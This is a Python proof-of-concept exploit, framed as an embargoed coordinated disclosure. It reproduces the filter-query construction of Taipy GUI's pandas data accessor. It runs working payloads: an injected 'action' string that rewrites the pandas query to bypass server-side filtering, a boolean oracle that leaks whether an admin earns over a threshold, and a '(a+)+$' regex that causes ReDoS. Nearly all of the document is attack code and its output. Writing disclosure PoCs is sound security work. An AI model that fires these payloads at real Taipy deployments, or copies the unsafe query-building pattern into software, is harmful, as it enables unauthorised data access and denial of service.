# EMBARGOED PoC - Taipy GUI pandas query injection + ReDoS. Coordinated disclosure only.
#!/usr/bin/env python3
"""PoC: unauthenticated pandas-query injection + ReDoS in Taipy GUI table filtering.

taipy/gui/data/pandas_data_accessor.py (_PandasDataAccessor.__get_data) builds a pandas
query from the client-supplied `filters` payload (delivered over the GUI WebSocket as a
DATA_UPDATE message, gui.py). String *values* are safely bound via `@vars[...]`, but the
column name (`col`) and the operator (`action`) are interpolated RAW into the query, and the
`contains` action puts the client value straight into `.str.contains(<regex>)`:

    right = f".str.contains({val})" if action == "contains" else f" {action} {val}"
    query += f"`{col}`{right}"
    df = df.query(query)          # default engine (python when numexpr absent)

An unauthenticated client therefore controls the pandas query expression. This PoC faithfully
replicates that builder and shows (1) query-expression injection (server-side filter bypass +
blind boolean data exfiltration) and (2) ReDoS DoS via an attacker regex in `contains`.
Non-destructive. (Per D-Tale CVE-2024-8862, user input into df.query(engine='python') is an
accepted command-execution class; RCE escalation is noted but not performed here.)
"""
import signal
import time

import pandas as pd


def taipy_filter(df, filters):
    """Verbatim filter/query construction from taipy-gui 3.0.0–4.0.2."""
    query = ""
    vars = []  # noqa: A001 - mirrors upstream name
    for fd in filters:
        col = fd.get("col")
        val = fd.get("value")
        action = fd.get("action")
        if isinstance(val, str):
            vars.append(val)
        val = f"@vars[{len(vars) - 1}]" if isinstance(val, str) else val
        right = f".str.contains({val})" if action == "contains" else f" {action} {val}"
        if query:
            query += " and "
        query += f"`{col}`{right}"
    return df.query(query), query


def _guard(s):
    signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(TimeoutError()))
    signal.setitimer(signal.ITIMER_REAL, s)


def main():
    df = pd.DataFrame({"salary": [100, 200, 300], "user": ["a", "b", "admin"]})

    print("== 1) query-expression injection via client-controlled 'action' ==")
    res, q = taipy_filter(df, [{"col": "salary", "value": 0, "action": "> -1 or `salary` > 999999 #"}])
    print("   built query:", repr(q))
    print(f"   server-side filter bypassed -> {len(res)}/{len(df)} rows returned")

    print("== 2) blind data exfiltration (boolean oracle) ==")
    probe, _ = taipy_filter(df, [{"col": "user", "value": "admin", "action": "contains"},
                                  {"col": "salary", "value": 250, "action": ">"}])
    print(f"   'does an admin earn >250?' -> {len(probe)} row(s) (leaks the answer)")

    print("== 3) ReDoS DoS via attacker regex in 'contains' ==")
    big = pd.DataFrame({"user": ["a" * 40 + "!"] * 50})
    try:
        _guard(6)
        t0 = time.perf_counter()
        taipy_filter(big, [{"col": "user", "value": "(a+)+$", "action": "contains"}])
        print("   time:", round(time.perf_counter() - t0, 3))
        signal.setitimer(signal.ITIMER_REAL, 0)
    except TimeoutError:
        print("   >6s -> catastrophic backtracking (denial of service)")


if __name__ == "__main__":
    main()
